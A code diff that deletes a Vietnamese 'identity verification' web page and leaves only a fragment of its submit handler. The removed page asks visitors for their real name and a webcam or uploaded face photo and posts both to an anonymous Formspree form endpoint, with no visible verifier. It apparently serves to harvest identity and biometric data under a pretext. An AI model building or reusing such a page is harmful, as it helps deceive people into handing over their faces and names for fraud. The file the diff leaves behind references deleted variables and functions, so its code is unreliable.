@@ -1,232 +1,42 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Xác minh tên & ảnh</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background: linear-gradient(270deg,#ff7a7a,#ffb36b,#fff38a,#9be89b,#7fb6ff,#b58bff);
-      background-size: 1400% 1400%;
-      animation: bg 18s linear infinite;
-    }
-    @keyframes bg {
-      0%{background-position:0% 50%}
-      50%{background-position:100% 50%}
-      100%{background-position:0% 50%}
-    }
-    .card {
-      width: 380px;
-      background: #fff;
-      padding: 22px;
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,.12);
-      text-align: center;
-    }
-    input[type="text"], input[type="file"] {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: 2px solid #ddd;
-      font-size: 15px;
-      box-sizing: border-box;
-      margin-top: 8px;
-    }
-    video, canvas, img {
-      width: 100%;
-      border-radius: 8px;
-      margin-top: 10px;
-    }
-    button {
-      margin-top: 12px;
-      padding: 10px 14px;
-      border-radius: 8px;
-      border: none;
-      background: #1976d2;
-      color: white;
-      font-size: 15px;
-      cursor: pointer;
-    }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
-    .msg { margin-top: 10px; font-size: 14px; }
-    .err { color: #b00020; }
-    .ok { color: #0b8043; font-weight: 600; }
-    #preview { display: none; }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h2>Xác minh danh tính</h2>
-    <p>Vui lòng nhập tên thật và chụp hoặc tải ảnh khuôn mặt để xác thực.</p>
-
-    <input id="nameInput" type="text" placeholder="Nhập tên thật của bạn" />
-    <div id="msg" class="msg"></div>
-
-    <button id="openCam">📸 Mở camera</button>
-    <p>hoặc</p>
-    <input id="fileInput" type="file" accept="image/*" />
-
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <img id="preview" alt="Ảnh đã chụp"/>
-
-    <div id="confirmBtns" style="display:none;">
-      <button id="captureBtn">Chụp ảnh</button>
-      <button id="retakeBtn" style="display:none;">Chụp lại</button>
-      <button id="sendBtn" style="display:none;">Gửi</button>
-    </div>
-  </div>
-
-  <!-- TOÀN BỘ CODE JAVASCRIPT NẰM GỌN TRONG THẺ SCRIPT -->
-  <script>
-  const FORMSPREE_ENDPOINT = "https://formspree.io/f/mwprbgra";
-
-  const nameInput = document.getElementById('nameInput');
-  const msg = document.getElementById('msg');
-  const openCamBtn = document.getElementById('openCam');
-  const fileInput = document.getElementById('fileInput');
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const preview = document.getElementById('preview');
-  const captureBtn = document.getElementById('captureBtn');
-  const retakeBtn = document.getElementById('retakeBtn');
-  const sendBtn = document.getElementById('sendBtn');
-  const confirmBtns = document.getElementById('confirmBtns');
-
-  let stream = null;
-  let capturedImage = null;
-
-  function isValidName(name) {
-    return /^[A-Za-zÀ-ỹ\s]+$/.test(name.trim()) && name.trim().length >= 3;
+// gửi dữ liệu (dạng base64)
+sendBtn.onclick = async () => {
+  const name = nameInput.value.trim();
+  if (!isValidName(name)) {
+    showError("Tên không hợp lệ.");
+    return;
+  }
+  if (!capturedImage) {
+    showError("Bạn chưa chụp hoặc tải ảnh.");
+    return;
   }
 
-  function showError(text) {
-    msg.textContent = "❌ " + text;
-    msg.className = "msg err";
+  msg.textContent = "⏳ Đang gửi...";
+  msg.className = "msg";
+
+  const data = {
+    name: name,
+    image: capturedImage  // gửi base64 string
+  };
+
+  try {
+    const res = await fetch(FORMSPREE_ENDPOINT, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    if (res.ok) {
+      showOK("Gửi thành công!");
+      nameInput.value = "";
+      preview.style.display = "none";
+      confirmBtns.style.display = "none";
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    } else {
+      showError("Gửi thất bại, thử lại sau.");
+    }
+  } catch (err) {
+    showError("Lỗi mạng hoặc Formspree không phản hồi.");
   }
-
-  function showOK(text) {
-    msg.textContent = "✅ " + text;
-    msg.className = "msg ok";
-  }
-
-  // mở camera
-  openCamBtn.onclick = async () => {
-    const name = nameInput.value.trim();
-    if (!isValidName(name)) {
-      showError("Vui lòng nhập tên thật trước khi mở camera.");
-      return;
-    }
-    msg.textContent = "";
-    confirmBtns.style.display = "block";
-
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      video.srcObject = stream;
-      video.style.display = "block";
-      openCamBtn.style.display = "none";
-      captureBtn.style.display = "inline-block";
-    } catch (err) {
-      showError("Không thể mở camera. Hãy cho phép truy cập camera.");
-    }
-  };
-
-  // chụp ảnh
-  captureBtn.onclick = () => {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    capturedImage = canvas.toDataURL('image/png');
-    preview.src = capturedImage;
-    preview.style.display = "block";
-    video.style.display = "none";
-    captureBtn.style.display = "none";
-    retakeBtn.style.display = "inline-block";
-    sendBtn.style.display = "inline-block";
-  };
-
-  // chụp lại
-  retakeBtn.onclick = () => {
-    preview.style.display = "none";
-    video.style.display = "block";
-    captureBtn.style.display = "inline-block";
-    retakeBtn.style.display = "none";
-    sendBtn.style.display = "none";
-  };
-
-  // nếu tải ảnh từ máy
-  fileInput.onchange = () => {
-    const file = fileInput.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = e => {
-        capturedImage = e.target.result;
-        preview.src = capturedImage;
-        preview.style.display = "block";
-        confirmBtns.style.display = "block";
-        captureBtn.style.display = "none";
-        retakeBtn.style.display = "none";
-        sendBtn.style.display = "inline-block";
-        if (stream) stream.getTracks().forEach(t => t.stop());
-      };
-      reader.readAsDataURL(file);
-    }
-  };
-
-  // gửi dữ liệu (gửi ảnh đính kèm thật)
-  sendBtn.onclick = async () => {
-    const name = nameInput.value.trim();
-    if (!isValidName(name)) {
-      showError("Tên không hợp lệ.");
-      return;
-    }
-    if (!capturedImage) {
-      showError("Bạn chưa chụp hoặc tải ảnh.");
-      return;
-    }
-
-    msg.textContent = "⏳ Đang gửi...";
-    msg.className = "msg";
-
-    function dataURLtoBlob(dataURL) {
-      const arr = dataURL.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
-    }
-
-    const formData = new FormData();
-    formData.append("name", name);
-    formData.append("image", dataURLtoBlob(capturedImage), "face.png");
-
-    try {
-      const res = await fetch(FORMSPREE_ENDPOINT, {
-        method: "POST",
-        body: formData
-      });
-
-      if (res.ok) {
-        showOK("Gửi thành công!");
-        nameInput.value = "";
-        preview.style.display = "none";
-        confirmBtns.style.display = "none";
-        if (stream) stream.getTracks().forEach(t => t.stop());
-      } else {
-        showError("Gửi thất bại, thử lại sau.");
-      }
-    } catch (err) {
-      showError("Lỗi mạng hoặc Formspree không phản hồi.");
-    }
-  };
-  </script>
-</body>
-</html>
+};
